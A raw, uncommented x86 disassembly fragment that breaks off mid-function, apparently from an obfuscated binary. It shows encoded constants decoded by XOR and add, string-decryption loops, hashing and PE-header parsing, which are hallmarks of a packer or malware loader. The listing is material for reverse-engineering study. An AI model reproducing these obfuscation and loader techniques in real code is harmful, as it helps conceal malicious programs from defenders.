  4286f9:	push   ebx
  4286fa:	call   0x4284f4
  4286ff:	mov    ecx,DWORD PTR [ebp-0xc]
  428702:	test   eax,eax
  428704:	je     0x42870b
  428706:	mov    eax,DWORD PTR [ebp-0x4]
  428709:	mov    DWORD PTR [eax],edi
  42870b:	mov    eax,DWORD PTR [ebp-0x10]
  42870e:	add    DWORD PTR [ebp-0x4],0x4
  428712:	dec    DWORD PTR [ebp-0x14]
  428715:	jne    0x4286eb
  428717:	mov    ebx,DWORD PTR [ebp-0x18]
  42871a:	inc    ebx
  42871b:	mov    DWORD PTR [ebp-0x18],ebx
  42871e:	cmp    ebx,DWORD PTR [ebp-0x8]
  428721:	jb     0x4286b7
  428723:	pop    esi
  428724:	pop    ebx
  428725:	pop    edi
  428726:	leave  
  428727:	ret    0x4
  42872a:	push   ebp
  42872b:	mov    ebp,esp
  42872d:	mov    eax,DWORD PTR [ebp+0x8]
  428730:	push   esi
  428731:	push   DWORD PTR [eax+0x1e0]
  428737:	lea    esi,[eax+0x198]
  42873d:	mov    eax,DWORD PTR [ebp+0x8]
  428740:	call   0x4285d9
  428745:	mov    ecx,DWORD PTR [esi]
  428747:	mov    DWORD PTR [ecx],eax
  428749:	mov    eax,DWORD PTR [esi]
  42874b:	xor    ecx,ecx
  42874d:	cmp    DWORD PTR [eax],ecx
  42874f:	pop    esi
  428750:	setne  cl
  428753:	mov    eax,ecx
  428755:	pop    ebp
  428756:	ret    0x4
  428759:	mov    ecx,DWORD PTR [edi+0x188]
  42875f:	push   ebx
  428760:	jmp    0x428775
  428762:	xor    eax,0x8a9a
  428767:	add    eax,0x3b5c
  42876c:	mov    WORD PTR [ecx],ax
  42876f:	add    ecx,0x2
  428772:	add    edx,0x2
  428775:	movzx  eax,WORD PTR [edx]
  428778:	mov    ebx,0x4e3e
  42877d:	cmp    ax,bx
  428780:	jne    0x428762
  428782:	xor    eax,eax
  428784:	mov    WORD PTR [ecx],ax
  428787:	mov    eax,DWORD PTR [edi+0x188]
  42878d:	pop    ebx
  42878e:	ret    
  42878f:	push   edi
  428790:	mov    edi,eax
  428792:	mov    eax,DWORD PTR [esi+0x188]
  428798:	shl    edi,0x6
  42879b:	add    eax,edi
  42879d:	jmp    0x4287a9
  42879f:	xor    cl,0x7e
  4287a2:	add    cl,0x3
  4287a5:	mov    BYTE PTR [eax],cl
  4287a7:	inc    eax
  4287a8:	inc    edx
  4287a9:	mov    cl,BYTE PTR [edx]
  4287ab:	cmp    cl,0x83
  4287ae:	jne    0x42879f
  4287b0:	mov    BYTE PTR [eax],0x0
  4287b3:	mov    eax,DWORD PTR [esi+0x188]
  4287b9:	add    eax,edi
  4287bb:	pop    edi
  4287bc:	ret    
  4287bd:	push   ebp
  4287be:	mov    ebp,esp
  4287c0:	sub    esp,0x14
  4287c3:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  4287ca:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  4287d1:	mov    eax,DWORD PTR [ebx]
  4287d3:	mov    DWORD PTR [ebp-0x8],eax
  4287d6:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4287dd:	push   esi
  4287de:	push   edi
  4287df:	mov    DWORD PTR [ebp-0x14],0xead71885
  4287e6:	mov    edi,DWORD PTR [ebp-0x4]
  4287e9:	mov    ecx,DWORD PTR [ebp-0x10]
  4287ec:	mov    eax,0x75108ae
  4287f1:	xor    edi,eax
  4287f3:	mov    edx,0x3272f5
  4287f8:	xor    ecx,eax
  4287fa:	add    edi,edx
  4287fc:	add    ecx,edx
  4287fe:	imul   edi,ecx
  428801:	jmp    0x428849
  428803:	mov    ecx,DWORD PTR [ebp-0x8]
  428806:	mov    esi,DWORD PTR [ebp-0x4]
  428809:	xor    ecx,eax
  42880b:	xor    esi,eax
  42880d:	add    ecx,edx
  42880f:	add    esi,edx
  428811:	test   esi,ecx
  428813:	mov    esi,DWORD PTR [ebp-0x8]
  428816:	mov    ecx,DWORD PTR [ebp-0x4]
  428819:	je     0x428830
  42881b:	xor    ecx,eax
  42881d:	xor    esi,eax
  42881f:	add    ecx,edx
  428821:	add    esi,edx
  428823:	shr    esi,cl
  428825:	mov    ecx,DWORD PTR [ebp-0x14]
  428828:	xor    ecx,eax
  42882a:	add    ecx,edx
  42882c:	xor    esi,ecx
  42882e:	jmp    0x42883a
  428830:	xor    esi,eax
  428832:	xor    ecx,eax
  428834:	add    esi,edx
  428836:	add    ecx,edx
  428838:	shr    esi,cl
  42883a:	mov    DWORD PTR [ebp-0x8],esi
  42883d:	mov    ecx,DWORD PTR [ebp-0x4]
  428840:	xor    ecx,eax
  428842:	lea    edi,[edi+ecx*1+0x3272f5]
  428849:	mov    ecx,DWORD PTR [ebp-0xc]
  42884c:	mov    esi,DWORD PTR [ebp-0x4]
  42884f:	xor    esi,eax
  428851:	xor    ecx,eax
  428853:	sub    ecx,esi
  428855:	cmp    edi,ecx
  428857:	jbe    0x428803
  428859:	mov    eax,DWORD PTR [ebp-0x8]
  42885c:	pop    edi
  42885d:	mov    DWORD PTR [ebx],eax
  42885f:	mov    eax,DWORD PTR [ebp-0x8]
  428862:	pop    esi
  428863:	leave  
  428864:	ret    
  428865:	push   ebp
  428866:	mov    ebp,esp
  428868:	sub    esp,0x38
  42886b:	push   ebx
  42886c:	mov    ebx,0xf89c85a5
  428871:	mov    DWORD PTR [ebp-0x4],ebx
  428874:	lea    ecx,[ebx-0x3]
  428877:	mov    DWORD PTR [ebp-0x24],ecx
  42887a:	mov    eax,DWORD PTR [ebp-0x4]
  42887d:	mov    edx,DWORD PTR [ebp+0x8]
  428880:	push   esi
  428881:	mov    esi,0x75108ae
  428886:	xor    eax,esi
  428888:	push   edi
  428889:	mov    edi,0x3272f5
  42888e:	add    eax,edi
  428890:	cmp    edx,eax
  428892:	mov    eax,DWORD PTR [ebp-0x4]
  428895:	je     0x4289fa
  42889b:	mov    edx,DWORD PTR [ebp+0xc]
  42889e:	xor    eax,esi
  4288a0:	add    eax,edi
  4288a2:	cmp    edx,eax
  4288a4:	je     0x4289f7
  4288aa:	mov    eax,DWORD PTR [ebp+0x10]
  4288ad:	mov    edx,DWORD PTR [ebp+0xc]
  4288b0:	mov    DWORD PTR [ebp-0x14],eax
  4288b3:	mov    eax,DWORD PTR [ebp+0x8]
  4288b6:	mov    DWORD PTR [ebp-0x18],0xf89c853d
  4288bd:	mov    DWORD PTR [ebp-0xc],eax
  4288c0:	lea    eax,[ebx-0x2]
  4288c3:	mov    DWORD PTR [ebp-0x1c],eax
  4288c6:	mov    DWORD PTR [ebp-0x10],ebx
  4288c9:	mov    DWORD PTR [ebp+0xc],ecx
  4288cc:	mov    DWORD PTR [ebp+0x10],eax
  4288cf:	mov    eax,DWORD PTR [ebp+0xc]
  4288d2:	xor    eax,esi
  4288d4:	mov    DWORD PTR [ebp-0x20],edx
  4288d7:	sub    edx,eax
  4288d9:	sub    edx,edi
  4288db:	mov    DWORD PTR [ebp+0x8],edx
  4288de:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  4288e5:	jmp    0x4289e7
  4288ea:	mov    eax,DWORD PTR [ebp+0xc]
  4288ed:	mov    ecx,DWORD PTR [ebp+0xc]
  4288f0:	xor    eax,esi
  4288f2:	xor    ecx,esi
  4288f4:	lea    ecx,[eax+ecx*1+0x64e5ea]
  4288fb:	mov    eax,DWORD PTR [ebp+0x8]
  4288fe:	xor    edx,edx
  428900:	div    ecx
  428902:	mov    eax,DWORD PTR [ebp+0x10]
  428905:	mov    ecx,DWORD PTR [ebp+0xc]
  428908:	xor    eax,esi
  42890a:	xor    ecx,esi
  42890c:	sub    eax,ecx
  42890e:	cmp    edx,eax
  428910:	jne    0x4289a6
  428916:	mov    eax,DWORD PTR [ebp+0x8]
  428919:	mov    ecx,DWORD PTR [ebp-0xc]
  42891c:	mov    dl,BYTE PTR [eax+ecx*1]
  42891f:	mov    eax,DWORD PTR [ebp-0x10]
  428922:	mov    ecx,DWORD PTR [ebp-0x8]
  428925:	xor    eax,esi
  428927:	xor    ecx,esi
  428929:	add    eax,edi
  42892b:	add    ecx,edi
  42892d:	cmp    eax,ecx
  42892f:	jae    0x428977
  428931:	lea    ecx,[eax-0x3272f5]
  428937:	mov    DWORD PTR [ebp-0x4],ecx
  42893a:	mov    ebx,DWORD PTR [ebp-0x4]
  42893d:	xor    ebx,esi
  42893f:	add    ebx,0x7f55d8e3
  428945:	lea    ecx,[ebp+eax*4-0x38]
  428949:	mov    DWORD PTR [ecx],ebx
  42894b:	mov    ebx,DWORD PTR [ecx]
  42894d:	cmp    ebx,0x244ecb80
  428953:	jbe    0x42895d
  428955:	add    DWORD PTR [ecx],0x405fcc1
  42895b:	jmp    0x428963
  42895d:	add    DWORD PTR [ecx],0xfdaf433f
  428963:	mov    ecx,DWORD PTR [ebp-0x8]
  428966:	xor    ecx,esi
  428968:	inc    eax
  428969:	inc    DWORD PTR [ebp-0x4]
  42896c:	add    ecx,edi
  42896e:	cmp    eax,ecx
  428970:	jb     0x42893a
  428972:	mov    ebx,0xf89c85a5
  428977:	cmp    DWORD PTR [ebp-0x14],0x0
  42897b:	jne    0x428985
  42897d:	xor    dl,0x7e
  428980:	add    dl,0x3
  428983:	jmp    0x42899b
  428985:	mov    eax,DWORD PTR [ebp-0x18]
  428988:	xor    al,0xae
  42898a:	mov    cl,0xb
  42898c:	sub    cl,al
  42898e:	add    dl,cl
  428990:	mov    ecx,DWORD PTR [ebp-0x1c]
  428993:	xor    cl,0xae
  428996:	sub    cl,0xb
  428999:	ror    dl,cl
  42899b:	xor    eax,eax
  42899d:	mov    eax,DWORD PTR [ebp+0x8]
  4289a0:	mov    ecx,DWORD PTR [ebp-0xc]
  4289a3:	mov    BYTE PTR [eax+ecx*1],dl
  4289a6:	mov    eax,DWORD PTR [ebp+0x8]
  4289a9:	mov    ecx,DWORD PTR [ebp-0x10]
  4289ac:	sub    eax,edi
  4289ae:	xor    eax,esi
  4289b0:	cmp    eax,ecx
  4289b2:	jne    0x4289d5
  4289b4:	mov    eax,DWORD PTR [ebp+0x10]
  4289b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4289ba:	xor    eax,esi
  4289bc:	xor    ecx,esi
  4289be:	sub    eax,ecx
  4289c0:	mov    ecx,DWORD PTR [ebp-0x20]
  4289c3:	sub    eax,edi
  4289c5:	xor    eax,esi
  4289c7:	mov    DWORD PTR [ebp+0x10],eax
  4289ca:	mov    eax,DWORD PTR [ebp+0xc]
  4289cd:	xor    eax,esi
  4289cf:	sub    ecx,eax
  4289d1:	sub    ecx,edi
  4289d3:	jmp    0x4289e4
  4289d5:	mov    eax,DWORD PTR [ebp+0xc]
  4289d8:	xor    eax,esi
  4289da:	mov    ecx,0xffcd8d0b
  4289df:	sub    ecx,eax
  4289e1:	add    ecx,DWORD PTR [ebp+0x8]
  4289e4:	mov    DWORD PTR [ebp+0x8],ecx
  4289e7:	mov    eax,DWORD PTR [ebp+0x10]
  4289ea:	cmp    eax,ebx
  4289ec:	jne    0x4288ea
  4289f2:	mov    eax,DWORD PTR [ebp-0x24]
  4289f5:	jmp    0x4289fa
  4289f7:	mov    eax,DWORD PTR [ebp-0x4]
  4289fa:	xor    eax,esi
  4289fc:	add    eax,edi
  4289fe:	pop    edi
  4289ff:	pop    esi
  428a00:	pop    ebx
  428a01:	leave  
  428a02:	ret    0xc
  428a05:	push   ebp
  428a06:	mov    ebp,esp
  428a08:	sub    esp,0x420
  428a0e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428a15:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  428a1c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  428a23:	push   ebx
  428a24:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  428a2b:	mov    eax,DWORD PTR [ebp-0x14]
  428a2e:	push   esi
  428a2f:	mov    esi,0x75108ae
  428a34:	push   edi
  428a35:	xor    eax,esi
  428a37:	mov    edi,0x3272f5
  428a3c:	add    eax,edi
  428a3e:	mov    DWORD PTR [ebp-0x8],eax
  428a41:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428a48:	mov    DWORD PTR [ebp-0x4],0xead71885
  428a4f:	mov    DWORD PTR [ebp-0x10],0x8
  428a56:	mov    ecx,ecx
  428a58:	mov    eax,DWORD PTR [ebp-0xc]
  428a5b:	mov    ecx,DWORD PTR [ebp-0x14]
  428a5e:	xor    eax,esi
  428a60:	xor    ecx,esi
  428a62:	add    eax,edi
  428a64:	add    ecx,edi
  428a66:	imul   eax,ecx
  428a69:	jmp    0x428a9c
  428a6b:	mov    eax,DWORD PTR [ebp-0x4]
  428a6e:	sub    eax,edi
  428a70:	xor    eax,esi
  428a72:	mov    DWORD PTR [ebp-0x8],eax
  428a75:	lea    ebx,[ebp-0x8]
  428a78:	call   0x4287bd
  428a7d:	mov    DWORD PTR [ebp-0x8],eax
  428a80:	mov    eax,DWORD PTR [ebp-0x8]
  428a83:	mov    ecx,DWORD PTR [ebp-0x4]
  428a86:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  428a8d:	mov    eax,DWORD PTR [ebp-0xc]
  428a90:	mov    ecx,DWORD PTR [ebp-0x4]
  428a93:	xor    eax,esi
  428a95:	lea    eax,[eax+ecx*1+0x3272f5]
  428a9c:	mov    DWORD PTR [ebp-0x4],eax
  428a9f:	mov    eax,DWORD PTR [ebp-0x18]
  428aa2:	mov    ecx,DWORD PTR [ebp-0xc]
  428aa5:	xor    ecx,esi
  428aa7:	xor    eax,esi
  428aa9:	sub    eax,ecx
  428aab:	mov    ecx,DWORD PTR [ebp-0x4]
  428aae:	cmp    ecx,eax
  428ab0:	jbe    0x428a6b
  428ab2:	mov    eax,DWORD PTR [ebp-0x1c]
  428ab5:	xor    eax,esi
  428ab7:	add    eax,edi
  428ab9:	mov    DWORD PTR [ebp-0x8],eax
  428abc:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428ac3:	mov    ebx,ebx
  428ac5:	jmp    0x428b28
  428ac7:	mov    ecx,DWORD PTR [ebp-0x20]
  428aca:	mov    eax,DWORD PTR [ebp-0x8]
  428acd:	xor    ecx,esi
  428acf:	add    ecx,edi
  428ad1:	shr    eax,cl
  428ad3:	mov    DWORD PTR [ebp-0x4],eax
  428ad6:	mov    eax,DWORD PTR [ebp+0x8]
  428ad9:	mov    cl,BYTE PTR [eax]
  428adb:	mov    BYTE PTR [ebp+0xb],cl
  428ade:	mov    cl,BYTE PTR [ebp+0xb]
  428ae1:	mov    edx,DWORD PTR [ebp-0x8]
  428ae4:	movzx  ecx,cl
  428ae7:	xor    ecx,edx
  428ae9:	mov    DWORD PTR [ebp+0x8],ecx
  428aec:	mov    ecx,DWORD PTR [ebp-0x18]
  428aef:	mov    edx,DWORD PTR [ebp+0x8]
  428af2:	xor    ecx,esi
  428af4:	add    ecx,edi
  428af6:	and    ecx,edx
  428af8:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  428aff:	mov    edx,DWORD PTR [ebp-0x4]
  428b02:	xor    ecx,edx
  428b04:	mov    DWORD PTR [ebp-0x8],ecx
  428b07:	mov    ecx,DWORD PTR [ebp-0xc]
  428b0a:	xor    ecx,esi
  428b0c:	lea    eax,[eax+ecx*1+0x3272f5]
  428b13:	mov    DWORD PTR [ebp+0x8],eax
  428b16:	mov    eax,DWORD PTR [ebp-0xc]
  428b19:	xor    eax,esi
  428b1b:	mov    ecx,0xffcd8d0b
  428b20:	sub    ecx,eax
  428b22:	add    ecx,DWORD PTR [ebp-0x10]
  428b25:	mov    DWORD PTR [ebp-0x10],ecx
  428b28:	mov    eax,DWORD PTR [ebp-0x14]
  428b2b:	mov    ecx,DWORD PTR [ebp-0x10]
  428b2e:	xor    eax,esi
  428b30:	add    eax,edi
  428b32:	cmp    ecx,eax
  428b34:	jne    0x428ac7
  428b36:	mov    eax,DWORD PTR [ebp-0x1c]
  428b39:	mov    ecx,DWORD PTR [ebp-0x8]
  428b3c:	xor    eax,esi
  428b3e:	add    eax,edi
  428b40:	pop    edi
  428b41:	pop    esi
  428b42:	xor    eax,ecx
  428b44:	pop    ebx
  428b45:	leave  
  428b46:	ret    0x4
  428b49:	push   ebp
  428b4a:	mov    ebp,esp
  428b4c:	mov    eax,DWORD PTR [ebp+0x1c]
  428b4f:	mov    ecx,DWORD PTR [ebp+0x8]
  428b52:	mov    edx,DWORD PTR [ebp+0x10]
  428b55:	mov    eax,DWORD PTR [eax+0x190]
  428b5b:	mov    eax,DWORD PTR [eax]
  428b5d:	sub    esp,0x64
  428b60:	push   ebx
  428b61:	push   esi
  428b62:	push   edi
  428b63:	mov    edi,0x75108ae
  428b68:	xor    ecx,edi
  428b6a:	mov    ebx,0x3272f5
  428b6f:	add    ecx,ebx
  428b71:	cmp    ecx,edx
  428b73:	jne    0x428b84
  428b75:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  428b7f:	jmp    0x429080
  428b84:	mov    ecx,DWORD PTR [ebp+0x8]
  428b87:	mov    esi,DWORD PTR [ebp+0x14]
  428b8a:	mov    edx,DWORD PTR [esi]
  428b8c:	xor    ecx,edi
  428b8e:	add    ecx,ebx
  428b90:	cmp    edx,ecx
  428b92:	je     0x42903b
  428b98:	mov    ecx,DWORD PTR [ebp+0x1c]
  428b9b:	mov    DWORD PTR [ebp-0x1c],eax
  428b9e:	mov    DWORD PTR [ebp+0x1c],ecx
  428ba1:	mov    ecx,DWORD PTR [ebp+0x18]
  428ba4:	mov    eax,DWORD PTR [esi]
  428ba6:	mov    DWORD PTR [ebp-0x20],eax
  428ba9:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428bb0:	mov    edx,0xf89c85a2
  428bb5:	mov    DWORD PTR [ebp-0x8],edx
  428bb8:	mov    eax,DWORD PTR [ebp+0x1c]
  428bbb:	mov    DWORD PTR [ebp+0x1c],eax
  428bbe:	mov    eax,DWORD PTR [ebp+0x1c]
  428bc1:	mov    eax,DWORD PTR [eax+0x190]
  428bc7:	mov    eax,DWORD PTR [eax]
  428bc9:	mov    DWORD PTR [ebp-0x24],ecx
  428bcc:	mov    ecx,DWORD PTR [ebp+0x1c]
  428bcf:	mov    ecx,DWORD PTR [ecx+0x190]
  428bd5:	mov    ecx,DWORD PTR [ecx]
  428bd7:	add    ecx,DWORD PTR [eax+0x3c]
  428bda:	mov    DWORD PTR [ebp+0x10],ecx
  428bdd:	mov    eax,DWORD PTR [ebp+0x8]
  428be0:	xor    eax,edi
  428be2:	add    eax,ebx
  428be4:	mov    DWORD PTR [ebp-0x4],eax
  428be7:	mov    eax,DWORD PTR [ebp+0x8]
  428bea:	xor    eax,edi
  428bec:	add    eax,ebx
  428bee:	mov    DWORD PTR [ebp+0x18],eax
  428bf1:	mov    eax,DWORD PTR [ebp+0x10]
  428bf4:	mov    eax,DWORD PTR [eax+0x50]
  428bf7:	sub    eax,0xc
  428bfa:	mov    DWORD PTR [ebp-0x28],eax
  428bfd:	mov    eax,DWORD PTR [ebp+0x10]
  428c00:	mov    eax,DWORD PTR [eax+0x38]
  428c03:	mov    ecx,DWORD PTR [ebp+0x10]
  428c06:	dec    eax
  428c07:	test   DWORD PTR [ecx+0x54],eax
  428c0a:	mov    eax,DWORD PTR [ebp+0x10]
  428c0d:	je     0x428c27
  428c0f:	mov    eax,DWORD PTR [eax+0x38]
  428c12:	mov    ecx,DWORD PTR [ebp+0x10]
  428c15:	mov    ecx,DWORD PTR [ecx+0x54]
  428c18:	dec    eax
  428c19:	not    eax
  428c1b:	and    ecx,eax
  428c1d:	mov    eax,DWORD PTR [ebp+0x10]
  428c20:	mov    eax,DWORD PTR [eax+0x38]
  428c23:	add    eax,ecx
  428c25:	jmp    0x428c2a
  428c27:	mov    eax,DWORD PTR [eax+0x54]
  428c2a:	mov    DWORD PTR [ebp+0x1c],eax
  428c2d:	mov    eax,DWORD PTR [ebp+0x8]
  428c30:	xor    eax,edi
  428c32:	add    eax,ebx
  428c34:	mov    DWORD PTR [ebp+0x18],eax
  428c37:	mov    eax,DWORD PTR [ebp+0x8]
  428c3a:	xor    eax,edi
  428c3c:	add    eax,ebx
  428c3e:	mov    DWORD PTR [ebp+0x18],eax
  428c41:	mov    eax,DWORD PTR [ebp+0x8]
  428c44:	mov    ecx,DWORD PTR [ebp-0x24]
  428c47:	xor    eax,edi
  428c49:	add    eax,ebx
  428c4b:	mov    DWORD PTR [ecx],eax
  428c4d:	mov    DWORD PTR [ebp+0x18],edx
  428c50:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  428c57:	mov    DWORD PTR [ebp+0x18],0xf89c85a0
  428c5e:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  428c65:	mov    eax,DWORD PTR [ebp-0x8]
  428c68:	mov    ecx,DWORD PTR [ebp+0x1c]
  428c6b:	xor    eax,edi
  428c6d:	add    eax,ebx
  428c6f:	imul   eax,ecx
  428c72:	mov    ecx,DWORD PTR [ebp+0x8]
  428c75:	mov    edx,DWORD PTR [ebp-0x28]
  428c78:	xor    ecx,edi
  428c7a:	lea    ecx,[ecx+edx*1+0x3272f5]
  428c81:	cmp    eax,ecx
  428c83:	jae    0x429034
  428c89:	mov    eax,DWORD PTR [ebp+0x8]
  428c8c:	xor    eax,edi
  428c8e:	add    eax,ebx
  428c90:	mov    DWORD PTR [ebp+0x18],eax
  428c93:	mov    eax,DWORD PTR [ebp+0x1c]
  428c96:	add    eax,DWORD PTR [ebp-0x1c]
  428c99:	mov    DWORD PTR [ebp-0x4],eax
  428c9c:	push   DWORD PTR [ebp-0x4]
  428c9f:	mov    esi,DWORD PTR [ebp-0x1c]
  428ca2:	mov    ecx,DWORD PTR [ebp+0x10]
  428ca5:	call   0x427df5
  428caa:	mov    DWORD PTR [ebp+0xc],eax
  428cad:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428cb4:	mov    eax,DWORD PTR [ebp-0x18]
  428cb7:	xor    eax,edi
  428cb9:	lea    ecx,[ebp-0x40]
  428cbc:	add    eax,ebx
  428cbe:	push   ecx
  428cbf:	call   0x428389
  428cc4:	mov    eax,DWORD PTR [ebp+0xc]
  428cc7:	test   eax,eax
  428cc9:	je     0x428d19
  428ccb:	mov    eax,DWORD PTR [ebp-0x18]
  428cce:	xor    eax,edi
  428cd0:	add    eax,ebx
  428cd2:	push   eax
  428cd3:	push   DWORD PTR [ebp+0xc]
  428cd6:	lea    eax,[ebp-0x40]
  428cd9:	push   eax
  428cda:	call   0x42827f
  428cdf:	mov    eax,DWORD PTR [ebp-0x4]
  428ce2:	mov    DWORD PTR [ebp-0x18],eax
  428ce5:	mov    eax,DWORD PTR [ebp-0x18]
  428ce8:	mov    ecx,DWORD PTR [ebp-0x1c]
  428ceb:	sub    eax,ecx
  428ced:	mov    DWORD PTR [ebp-0x18],eax
  428cf0:	mov    eax,DWORD PTR [ebp+0xc]
  428cf3:	mov    ecx,DWORD PTR [ebp+0xc]
  428cf6:	mov    eax,DWORD PTR [eax+0x10]
  428cf9:	add    eax,DWORD PTR [ecx+0xc]
  428cfc:	mov    ecx,DWORD PTR [ebp-0x18]
  428cff:	cmp    ecx,eax
  428d01:	jb     0x428d19
  428d03:	mov    eax,DWORD PTR [ebp+0xc]
  428d06:	mov    eax,DWORD PTR [eax+0xc]
  428d09:	mov    ecx,DWORD PTR [ebp+0xc]
  428d0c:	add    eax,DWORD PTR [ecx+0x8]
  428d0f:	mov    ecx,DWORD PTR [ebp-0x18]
  428d12:	sub    eax,ecx
  428d14:	jmp    0x429007
  428d19:	push   0xc
  428d1b:	push   DWORD PTR [ebp-0x4]
  428d1e:	lea    eax,[ebp-0x4c]
  428d21:	push   eax
  428d22:	call   0x42827f
  428d27:	mov    eax,0xf89c85a5
  428d2c:	mov    DWORD PTR [ebp-0x2c],eax
  428d2f:	mov    DWORD PTR [ebp-0x30],0xf89c85a2
  428d36:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  428d3d:	mov    DWORD PTR [ebp-0x38],0xf89c85a0
  428d44:	lea    ecx,[ebp-0x2c]
  428d47:	mov    DWORD PTR [ebp-0xc],ecx
  428d4a:	lea    ecx,[ebp-0x30]
  428d4d:	mov    DWORD PTR [ebp-0x10],ecx
  428d50:	lea    ecx,[ebp-0x34]
  428d53:	mov    DWORD PTR [ebp+0xc],ecx
  428d56:	lea    ecx,[ebp-0x38]
  428d59:	mov    DWORD PTR [ebp-0x14],ecx
  428d5c:	mov    ecx,DWORD PTR [ebp+0x8]
  428d5f:	xor    ecx,edi
  428d61:	add    ecx,ebx
  428d63:	mov    DWORD PTR [ebp-0x18],ecx
  428d66:	jmp    0x428f62
  428d6b:	cmp    eax,0xf89c85a3
  428d70:	je     0x428f74
  428d76:	mov    ecx,DWORD PTR [ebp-0x8]
  428d79:	xor    ecx,edi
  428d7b:	mov    esi,eax
  428d7d:	add    ecx,ebx
  428d7f:	mov    DWORD PTR [ebp+0x18],ecx
  428d82:	mov    eax,DWORD PTR [ebp-0x18]
  428d85:	xor    esi,edi
  428d87:	lea    eax,[eax+esi*1+0x3272f5]
  428d8e:	mov    DWORD PTR [ebp-0x18],eax
  428d91:	mov    eax,DWORD PTR [ebp-0x8]
  428d94:	mov    ecx,DWORD PTR [ebp-0x18]
  428d97:	xor    eax,edi
  428d99:	add    eax,ebx
  428d9b:	cmp    ecx,eax
  428d9d:	jne    0x428db2
  428d9f:	mov    eax,DWORD PTR [ebp+0x8]
  428da2:	xor    eax,edi
  428da4:	add    eax,ebx
  428da6:	push   eax
  428da7:	push   0xc
  428da9:	lea    eax,[ebp-0x4c]
  428dac:	push   eax
  428dad:	call   0x428865
  428db2:	mov    eax,DWORD PTR [ebp-0xc]
  428db5:	mov    eax,DWORD PTR [eax]
  428db7:	xor    eax,edi
  428db9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428dc0:	mov    ecx,DWORD PTR [ebp+0x8]
  428dc3:	xor    ecx,edi
  428dc5:	movzx  eax,al
  428dc8:	add    ecx,ebx
  428dca:	cmp    eax,ecx
  428dcc:	je     0x428f4a
  428dd2:	mov    eax,DWORD PTR [ebp-0x10]
  428dd5:	mov    eax,DWORD PTR [eax]
  428dd7:	xor    eax,edi
  428dd9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428de0:	mov    ecx,DWORD PTR [ebp+0x8]
  428de3:	xor    ecx,edi
  428de5:	movzx  eax,al
  428de8:	add    ecx,ebx
  428dea:	cmp    eax,ecx
  428dec:	je     0x428f4a
  428df2:	mov    eax,DWORD PTR [ebp+0xc]
  428df5:	mov    eax,DWORD PTR [eax]
  428df7:	xor    eax,edi
  428df9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e00:	mov    ecx,DWORD PTR [ebp+0x8]
  428e03:	xor    ecx,edi
  428e05:	movzx  eax,al
  428e08:	add    ecx,ebx
  428e0a:	cmp    eax,ecx
  428e0c:	je     0x428f4a
  428e12:	mov    eax,DWORD PTR [ebp-0x14]
  428e15:	mov    eax,DWORD PTR [eax]
  428e17:	xor    eax,edi
  428e19:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e20:	mov    ecx,DWORD PTR [ebp+0x8]
  428e23:	xor    ecx,edi
  428e25:	movzx  eax,al
  428e28:	add    ecx,ebx
  428e2a:	cmp    eax,ecx
  428e2c:	je     0x428f4a
  428e32:	mov    eax,DWORD PTR [ebp-0x10]
  428e35:	mov    eax,DWORD PTR [eax]
  428e37:	xor    eax,edi
  428e39:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e40:	mov    ecx,DWORD PTR [ebp-0xc]
  428e43:	mov    ecx,DWORD PTR [ecx]
  428e45:	xor    ecx,edi
  428e47:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e4e:	xor    al,cl
  428e50:	mov    ecx,DWORD PTR [ebp+0xc]
  428e53:	mov    ecx,DWORD PTR [ecx]
  428e55:	xor    ecx,edi
  428e57:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e5e:	or     al,cl
  428e60:	mov    ecx,DWORD PTR [ebp-0xc]
  428e63:	mov    ecx,DWORD PTR [ecx]
  428e65:	xor    ecx,edi
  428e67:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428e6e:	cmp    cl,al
  428e70:	jne    0x428f4a
  428e76:	mov    eax,DWORD PTR [ebp+0xc]
  428e79:	mov    eax,DWORD PTR [eax]
  428e7b:	xor    eax,edi
  428e7d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e84:	mov    ecx,DWORD PTR [ebp-0x10]
  428e87:	mov    ecx,DWORD PTR [ecx]
  428e89:	xor    ecx,edi
  428e8b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e92:	xor    al,cl
  428e94:	mov    ecx,DWORD PTR [ebp-0x14]
  428e97:	mov    ecx,DWORD PTR [ecx]
  428e99:	xor    ecx,edi
  428e9b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ea2:	or     al,cl
  428ea4:	mov    ecx,DWORD PTR [ebp-0x10]
  428ea7:	mov    ecx,DWORD PTR [ecx]
  428ea9:	xor    ecx,edi
  428eab:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428eb2:	cmp    cl,al
  428eb4:	jne    0x428f4a
  428eba:	mov    eax,DWORD PTR [ebp-0x14]
  428ebd:	mov    eax,DWORD PTR [eax]
  428ebf:	xor    eax,edi
  428ec1:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428ec8:	mov    ecx,DWORD PTR [ebp+0xc]
  428ecb:	mov    ecx,DWORD PTR [ecx]
  428ecd:	xor    ecx,edi
